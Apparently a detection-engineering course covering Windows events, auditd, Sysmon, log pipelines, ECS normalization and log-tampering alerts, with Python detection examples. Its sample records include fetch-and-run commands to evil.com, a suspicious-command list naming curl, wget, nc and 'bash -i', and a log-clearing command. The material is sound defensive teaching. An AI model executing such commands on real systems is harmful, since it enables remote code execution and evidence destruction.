Concept 1 — Windows Event Log Architecture

Windows logs everything through the Event Tracing for Windows (ETW) subsystem. Every security-relevant action — logon, process creation, object access — produces a structured XML record written to a .evtx file under C:\Windows\System32\winevt\Logs\.

Three channels matter most for detection:

  • Security — authentication events, privilege use, object access
  • System — service starts/stops, driver loads
  • Application — application-level errors and warnings

Each event has an Event ID (the action code) and a Provider (who generated it). The Security channel's provider is Microsoft-Windows-Security-Auditing. Think of Event IDs as HTTP status codes — once you know the map, you can triage quickly.

Data engineering analogy: ETW is a streaming producer (Kafka), .evtx files are append-only topic partitions, and your SIEM is the consumer pulling offsets.

Example:

<!-- Event ID 4624 — Successful Logon (Security channel) -->
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4624</EventID>
    <TimeCreated SystemTime="2024-03-15T08:23:41Z"/>
    <Computer>WORKSTATION-01</Computer>
  </System>
  <EventData>
    <Data Name="SubjectUserName">-</Data>
    <Data Name="TargetUserName">jsmith</Data>
    <Data Name="TargetDomainName">CORP</Data>
    <Data Name="LogonType">3</Data>
    <Data Name="IpAddress">192.168.1.50</Data>
    <Data Name="AuthenticationPackageName">Kerberos</Data>
  </EventData>
</Event>

Example:


def is_lateral_movement_candidate(event: dict) -> bool:
    """Flag network logons between two non-DC workstations."""
    lateral_types = {3, 10}
    source = event.get("source_host", "")
    target = event.get("target_host", "")
    logon_type = event.get("logon_type", 0)

    is_workstation_to_workstation = (
        not source.startswith("DC") and
        not target.startswith("DC") and
        source != target
    )
    return logon_type in lateral_types and is_workstation_to_workstation

event = {"source_host": "WS-01", "target_host": "WS-07", "logon_type": 3, "user": "jsmith"}
print(is_lateral_movement_candidate(event))  # True

Concept 1 — Linux Logging Subsystems


Linux has two parallel logging subsystems that serve different purposes:


syslog / journald — system and application messages. Written to /var/log/syslog (Debian) or /var/log/messages (RHEL). Format: timestamp hostname process[pid]: message. Great for service crashes, sudo usage, SSH connections.


auditd — kernel-level syscall auditing. Written to /var/log/audit/audit.log. Format uses key=value pairs. Can log every execve(), file open, network connect, and user action at the kernel level. Much more tamper-resistant than syslog.


Data engineering analogy: syslog is an application log (like your ETL pipeline print statements). auditd is database write-ahead logging — low-level, structured, and authoritative.


Example:


# syslog SSH entry
Mar 15 08:23:41 server01 sshd[1234]: Accepted publickey for deploy from 10.0.1.20 port 52341

# auditd execve entry (parsed)
# type=EXECVE msg=audit(1710490221.445:889): argc=3 a0="bash" a1="-c" a2="curl http://evil.com/shell.sh | bash"

# Parse auditd key=value format
import re

def parse_auditd_line(line: str) -> dict:
    return dict(re.findall(r'(\w+)="?([^"\s]+)"?', line))

line = 'type=EXECVE msg=audit(1710490221:889): argc=3 a0="bash" a1="-c" a2="id"'

import subprocess

def get_recent_ssh_logins(n: int = 10) -> list[str]:
    """Read SSH login history via 'last' command."""
    result = subprocess.run(
        ["last", "-n", str(n), "-F"],
        capture_output=True, text=True
    )
    lines = [l for l in result.stdout.splitlines() if l.strip() and "reboot" not in l]
    return lines

Concept 3 — auditd Rules and EXECVE Logging


auditd is only useful if rules are configured. A default install logs almost nothing. Detection engineers add rules to capture the events that matter.


Rules follow the pattern: auditctl -a always,exit -F arch=b64 -S execve -k exec_log


Key rule fields:


    

  • -a always,exit — log on syscall exit
    • 

  • -F arch=b64 — 64-bit processes
    • 

  • -S execve — the execve syscall (every process launch)
    • 

  • -k exec_log — tag for filtering in audit.log
    • 



The ausearch command searches audit.log by key, time, or user. aureport generates summaries.


Example:


# Simulate parsing auditd EXECVE records for suspicious commands
SUSPICIOUS_COMMANDS = ["curl", "wget", "nc", "ncat", "bash -i", "python -c", "perl -e"]

def flag_suspicious_execve(records: list[dict]) -> list[dict]:
    """Flag records where command matches known suspicious patterns."""
    flagged = []
    for rec in records:
        cmd = rec.get("command", "")
        if any(s in cmd for s in SUSPICIOUS_COMMANDS):
            flagged.append({**rec, "flag": "suspicious_execve"})
    return flagged

records = [
    {"pid": "1234", "uid": "1001", "command": "curl http://10.0.0.1/shell.sh"},
    {"pid": "1235", "uid": "0",    "command": "ls -la /etc"},
    {"pid": "1236", "uid": "1001", "command": "wget -O /tmp/x http://evil.com/x"},
]
print(flag_suspicious_execve(records))

Concept 1 — What Sysmon Is and Why It Matters


System Monitor (Sysmon) is a free Windows Sysinternals tool that installs as a kernel driver and service. It generates extremely rich event logs that the native Security channel cannot produce — including process GUIDs, full command lines, parent-child process relationships, network connection details, DNS queries, and file hashes.


Sysmon events land in Microsoft-Windows-Sysmon/Operational and are readable via Event Viewer or forwarded to a SIEM. They're structured XML, like Security events, but with far more fields per record.

Concept 2 — Sysmon Configuration and Filtering


A default Sysmon install with no config logs everything, producing enormous noise. The SwiftOnSecurity sysmon-config (widely used in the community) uses an exclude-based approach: log everything except known-safe processes.


Config is XML. Key structure:


<Sysmon schemaversion="4.90">
  <EventFiltering>
    <ProcessCreate onmatch="exclude">
      <!-- exclude noisy but safe processes -->
      <Image condition="is">C:\Windows\System32\svchost.exe</Image>
    </ProcessCreate>
    <NetworkConnect onmatch="exclude">
      <Image condition="is">C:\Windows\System32\svchost.exe</Image>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>

onmatch="exclude" means: log everything except these. onmatch="include" means: log only these.


For detection engineering, the include model is used in honeypot/canary environments; the exclude model is used for production endpoint coverage.


Example:


# Simulate the effect of exclude-based filtering

Concept 3 — Sysmon Network and DNS Events


Sysmon EventID 3 (NetworkConnect) and EventID 22 (DNS Query) are essential for detecting C2 beaconing and data exfiltration. These events include source/destination IP, port, process that made the connection, and DNS query name — data that Windows Firewall logs omit.


A process making outbound connections to random-looking domains every 60 seconds is a C2 beacon. Sysmon EventID 22 captures the DNS query, and EventID 3 captures the TCP/UDP connection — correlating both gives you the full picture.


Example:


import collections

def detect_dns_beaconing(dns_events: list[dict], threshold_count: int = 5) -> list[dict]:
    """
    Flag processes making repeated DNS queries to the same domain.
    Returns candidates sorted by query count descending.
    """
    counter: dict[tuple, int] = collections.Counter()
    for e in dns_events:
        key = (e["Image"], e["QueryName"])
        counter[key] += 1

    candidates = [
        {"image": k[0], "domain": k[1], "query_count": v}
        for k, v in counter.items()
        if v >= threshold_count
    ]
    return sorted(candidates, key=lambda x: x["query_count"], reverse=True)

dns_events = [
    {"EventID": 22, "Image": "C:\\Temp\\beacon.exe", "QueryName": "c2.evil.com"},
    {"EventID": 22, "Image": "C:\\Temp\\beacon.exe", "QueryName": "c2.evil.com"},
    {"EventID": 22, "Image": "C:\\Temp\\beacon.exe", "QueryName": "c2.evil.com"},
    {"EventID": 22, "Image": "C:\\Temp\\beacon.exe", "QueryName": "c2.evil.com"},
    {"EventID": 22, "Image": "C:\\Temp\\beacon.exe", "QueryName": "c2.evil.com"},
    {"EventID": 22, "Image": "C:\\Windows\\chrome.exe", "QueryName": "google.com"},
]
print(detect_dns_beaconing(dns_events))

Concept 1 — Log Forwarding Architecture


Raw logs sitting on a single endpoint are useless for detection at scale. A log forwarding pipeline collects events from hundreds or thousands of endpoints and centralizes them. The standard architecture:


Endpoint (Windows/Linux)
    → Agent (Winlogbeat / NXLog / Fluentd)
        → Transport (TLS, over port 5044/5514)
            → Aggregator (Logstash / Vector)
                → Storage (Elasticsearch / Splunk / Sentinel)

Key agents:


    

  • Winlogbeat — reads Windows Event Log, forwards to Elasticsearch
    • 

  • Fluentd / Fluent Bit — lightweight, works on Linux and Windows
    • 

  • NXLog — used in enterprise Windows environments
    • 

  • Azure Monitor Agent — forwards to Log Analytics Workspace (Sentinel)
    • 



Data engineering analogy: this is exactly a Kafka producer → broker → consumer pipeline. The agent is the producer, the SIEM is the consumer, and the transport is the broker.

Concept 2 — Log Normalization and ECS


Raw logs from different sources use different field names for the same concept. A Windows logon event calls the user TargetUserName. A Linux SSH event calls it user. A firewall event calls it src_user. A SIEM needs a common schema to query across all sources with a single field name.


Elastic Common Schema (ECS) is the most widely adopted normalization standard:


    

  • event.action — what happened (user-logon, file-create, dns-query)
    • 

  • event.category — high-level category (authentication, network, file)
    • 

  • source.ip / destination.ip — IPs
    • 

  • user.name — the user
    • 

  • process.name / process.command_line — process info
    • 

  • host.hostname — the endpoint
    • 



Think of ECS as the dbt staging layer: raw source data mapped to a consistent schema so downstream queries don't care about source differences.


Example:


def normalize_windows_logon(raw: dict) -> dict:
    """Map Windows 4624 event fields to ECS."""
    return {
        "event.action": "user-logon",
        "event.category": "authentication",
        "event.outcome": "success",
        "event.code": str(raw.get("EventID", "")),
        "user.name": raw.get("TargetUserName", ""),
        "user.domain": raw.get("TargetDomainName", ""),
        "source.ip": raw.get("IpAddress", ""),
        "host.hostname": raw.get("Computer", ""),
        "winlog.logon.type": raw.get("LogonType", ""),
    }

    "EventID": 4624,
    "TargetUserName": "jsmith",
    "TargetDomainName": "CORP",
    "IpAddress": "192.168.1.50",

Concept 3 — Log Integrity and Tampering Detection


Attackers who gain admin access to a compromised host will attempt to delete or modify logs to cover their tracks. Windows Event Log can be cleared with wevtutil cl Security — and that clearing itself generates Event ID 1102. Linux syslog can be overwritten or truncated.


Defenses:


    

  1. Forward logs off-host immediately — once in a SIEM, clearing the local log doesn't matter
    2. 

  2. Monitor for Event ID 1102 (Security log cleared) and Event ID 104 (System log cleared)
    3. 

  3. Monitor for log size decreases — a shrinking log file is suspicious
    4. 

  4. Use auditd write-protection rules to detect writes to /var/log/auth.log
    5. 



Example:


def detect_log_clearing_events(events: list[dict]) -> list[dict]:
    """Identify Windows log-clearing events."""
    LOG_CLEAR_IDS = {
        1102: "security_log_cleared",
        104: "system_log_cleared",
    }
    alerts = []
    for e in events:
        eid = e.get("EventID")
        if eid in LOG_CLEAR_IDS:
            alerts.append({
                "alert": LOG_CLEAR_IDS[eid],
                "timestamp": e.get("TimeCreated"),
                "user": e.get("SubjectUserName"),
                "host": e.get("Computer"),
                "severity": "HIGH",
            })
    return alerts

events = [
    {"EventID": 4624, "TimeCreated": "2024-03-15T08:00:00Z", "Computer": "WS-01"},
    {"EventID": 1102, "TimeCreated": "2024-03-15T08:05:00Z", "Computer": "WS-01", "SubjectUserName": "attacker"},
]
print(detect_log_clearing_events(events))

Concept 2 — Feature Engineering for Detection


Raw Sysmon fields are good, but derived features make detections more powerful. Detection engineers add computed columns that capture suspicious patterns:


    

  • command_line_length — unusually long command lines suggest encoded payloads
    • 

  • is_temp_path — process running from %TEMP%, C:\Temp, C:\Windows\Temp
    • 

  • is_encoded — command line contains -EncodedCommand or -enc
    • 

  • parent_child_unusual — known unusual parent-child pairs (Word spawning cmd.exe)
    • 

  • integrity_high_non_admin — High integrity process run by non-admin user
    • 



These features become columns in the detection dataset and feed directly into detection rules or ML models.


Example:


def add_detection_features(df: pd.DataFrame) -> pd.DataFrame:
    df = df.copy()
    df["cmd_length"] = df["CommandLine"].str.len()
    df["is_temp_path"] = df["Image"].str.lower().str.contains(r"\\temp\\|\\tmp\\", regex=True)
    df["is_encoded_cmd"] = df["CommandLine"].str.lower().str.contains(
        r"-encodedcommand|-enc\s", regex=True
    )
    df["process_name"] = df["Image"].str.split("\\").str[-1].str.lower()
    df["parent_name"] = df["ParentImage"].str.split("\\").str[-1].str.lower()
    df["suspicious_parent"] = df.apply(
        lambda r: r["process_name"] in {"cmd.exe", "powershell.exe"}
        and r["parent_name"] in {"winword.exe", "excel.exe", "outlook.exe"},
        axis=1
    )
    return df

Concept 3 — Writing the Detection Dataset to Parquet


Parquet is the standard format for analytical detection datasets. It's columnar (fast range scans on EventID, timestamp), compressed (10x smaller than CSV for log data), and schema-aware (timestamp types preserved).


The normalized Parquet file this week is the Royal Road output — it will be queried in W09 (KQL translation), enriched in W10 (detection-as-code), and extended in W11 (behavioral analytics).


Example:


import pandas as pd
import pyarrow as pa
import pyarrow.parquet as pq
from pathlib import Path

def write_detection_dataset(df: pd.DataFrame, output_path: str) -> None:
    """Write normalized Sysmon DataFrame to Parquet with schema enforcement."""
    schema = pa.schema([
        pa.field("EventID", pa.int32()),
        pa.field("UtcTime", pa.timestamp("us")),
        pa.field("Image", pa.string()),
        pa.field("CommandLine", pa.string()),
        pa.field("ParentImage", pa.string()),
        pa.field("User", pa.string()),
        pa.field("IntegrityLevel", pa.string()),
        pa.field("Hashes", pa.string()),
        pa.field("ProcessId", pa.string()),
        pa.field("process_name", pa.string()),
        pa.field("cmd_length", pa.int32()),
        pa.field("is_temp_path", pa.bool_()),
        pa.field("is_encoded_cmd", pa.bool_()),
        pa.field("risk_score", pa.int32()),
    ])
    table = pa.Table.from_pandas(df, schema=schema, preserve_index=False)
    pq.write_table(table, output_path, compression="snappy")
    print(f"Wrote {len(df)} records to {output_path}")

def read_detection_dataset(path: str) -> pd.DataFrame:
    return pq.read_table(path).to_pandas()
